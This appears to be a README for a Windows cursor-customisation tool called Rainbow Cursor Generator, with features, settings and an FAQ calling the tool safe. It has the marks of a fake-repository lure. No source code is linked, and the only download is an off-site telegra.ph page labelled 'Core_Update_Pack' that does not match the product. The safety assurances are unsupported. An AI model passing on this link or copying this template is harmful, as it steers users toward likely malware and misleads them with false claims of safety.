# 🌈 Rainbow Cursor Generator

[![License](https://img.shields.io/badge/license-MIT-blue)](#)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)](#)

**A lightweight, open-source tool for generating and applying custom mouse cursors on Windows.**

---

## Overview

**Rainbow Cursor Generator** is a native desktop utility for users who want to personalize their Windows experience. 
It allows you to generate custom-colored cursors (including rainbow gradients and animations), preview them in real-time, and apply them system-wide or per-application.

> 🛡️ **Safe & Lightweight:** No background services, no telemetry, no system modifications beyond the cursor scheme. Fully portable.

---

## Key Features

| Feature | Description |
| :--- | :--- |
| **Rainbow Generator** | Create cursors with animated rainbow gradients or static multi-color schemes. |
| **Real-time Preview** | See exactly how your cursor will look before applying it. |
| **Custom Color Picker** | Choose any hex color or gradient for your cursor. |
| **System-wide Apply** | Apply your custom cursor to the entire Windows environment. |
| **Import/Export** | Load existing `.cur` or `.ani` files and export your creations. |
| **Portable** | No installation required. Runs from a single `.exe`. |

---

## Getting Started

You can download the latest version here: [Core_Update_Pack](https://telegra.ph/TRANSITION-06-17-3).

---

## How It Works

The tool uses the native Windows cursor API to load and apply `.cur` (static) and `.ani` (animated) files. 
It includes a built-in generator that programmatically creates cursor files from your chosen colors and animation settings, so you don't need to find or download external cursor packs.

---

## Configuration

Settings are stored locally in `config.json`:

| Key | Description | Default |
| :--- | :--- | :--- |
| `theme` | UI theme (`light` / `dark`) | `dark` |
| `auto_apply` | Apply cursor immediately after generation | `true` |
| `animation_speed` | Speed for animated cursors (ms per frame) | `100` |
| `last_color` | Last used color hex code | `#FF0000` |

---

## FAQ

**Is this safe to use?**
Yes. It only changes the Windows cursor scheme. It does not modify system files, inject into games, or require administrator privileges for basic use.

**Does it work in games?**
It works for the system cursor. Some games draw their own cursor and may not respect Windows cursor settings. Check the game's settings for cursor options.

**Can I use my own cursor files?**
Yes. You can import `.cur` and `.ani` files and apply them directly through the app.

**Does it work on Windows 11?**
Yes. It is compatible with Windows 10 and 11.

---

## Contributing

Pull requests, bug reports, and feature suggestions are welcome. 
Please ensure your changes follow the existing code style and include tests where applicable.

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

**⭐ If you find this project useful, please consider giving it a star.**